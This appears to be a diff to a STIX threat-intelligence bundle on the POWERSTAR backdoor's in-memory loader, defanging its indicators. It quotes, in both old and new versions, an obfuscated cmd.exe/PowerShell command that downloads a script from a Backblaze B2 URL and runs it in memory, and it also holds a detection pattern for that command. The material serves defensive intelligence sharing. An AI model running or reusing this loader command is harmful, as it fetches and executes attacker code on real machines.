@@ -44,7 +44,7 @@
       "type": "indicator",
       "id": "indicator--8df338e4-7dc4-40ba-b081-74757c2d6c3d",
       "name": "POWERSTAR in-memory loader command line",
-      "pattern": "[process:command_line LIKE '%gcm i*x%' AND process:command_line LIKE '%backblazeb2.com%']",
+      "pattern": "[process:command_line LIKE '%gcm i*x%' AND process:command_line LIKE '%backblazeb2[.]com%']",
       "pattern_type": "stix",
       "valid_from": "2026-07-28T14:14:00.000Z",
       "indicator_types": [
@@ -60,7 +60,7 @@
       "modified": "2026-07-28T14:14:00.000Z",
       "created_by_ref": "identity--8e4eb3a6-8119-430e-bf82-1d480fd3ce94",
       "name": "Load POWERSTAR backdoor in memory via remote-hosted decryption stage",
-      "description": "Keep the POWERSTAR backdoor off disk and give the operator a remote kill switch over it. A malicious LNK runs cmd.exe to build an obfuscated PowerShell command that downloads a first-stage script from Backblaze B2 and runs it in memory through the Invoke-Expression alias 'gcm i*x'. A second remote script supplies the AES decryption routine and key; only then is the encrypted backdoor decrypted and run, and if that script is withdrawn the payload cannot be recovered. A defender sees cmd.exe spawning PowerShell with a wildcard Get-Command lookup and outbound HTTPS to backblazeb2.com.",
+      "description": "Keep the POWERSTAR backdoor off disk and give the operator a remote kill switch over it. A malicious LNK runs cmd.exe to build an obfuscated PowerShell command that downloads a first-stage script from Backblaze B2 and runs it in memory through the Invoke-Expression alias 'gcm i*x'. A second remote script supplies the AES decryption routine and key; only then is the encrypted backdoor decrypted and run, and if that script is withdrawn the payload cannot be recovered. A defender sees cmd.exe spawning PowerShell with a wildcard Get-Command lookup and outbound HTTPS to backblazeb2[.]com.",
       "x_procedure_type": "reporting",
       "platforms": [
         "Windows"
@@ -99,7 +99,7 @@
       "type": "process",
       "spec_version": "2.1",
       "id": "process--24208e46-d950-42ff-a9c3-53b24b5b5dc8",
-      "command_line": "cmd.exe /c set c=powershecde43ell.ecde43exe -wcde43e 1 \"$p=(wgcde43eet -Ucde43eri https://bluebox10546.s3.us-west-004.backblazeb2.com/sa/88W3X81EN/cettj34c.txt -UseBasicde43ecParsing).Contcde43eent; &(gcm i*x)$p\"; & call %c:cde43e=%"
+      "command_line": "cmd.exe /c set c=powershecde43ell.ecde43exe -wcde43e 1 \"$p=(wgcde43eet -Ucde43eri hxxps://bluebox10546.s3.us-west-004.backblazeb2[.]com/sa/88W3X81EN/cettj34c.txt -UseBasicde43ecParsing).Contcde43eent; &(gcm i*x)$p\"; & call %c:cde43e=%"
     },
     {
       "type": "relationship",
@@ -229,8 +229,7 @@
       "x_source_refs": [
         "report--e5b9d3a7-1c48-4a2f-b6d0-7a3e9c1f8b52"
       ],
-      "confidence": 75,
-      "created_by_ref": "identity--8e4eb3a6-8119-430e-bf82-1d480fd3ce94"
+      "confidence": 75
     }
   ]
 }
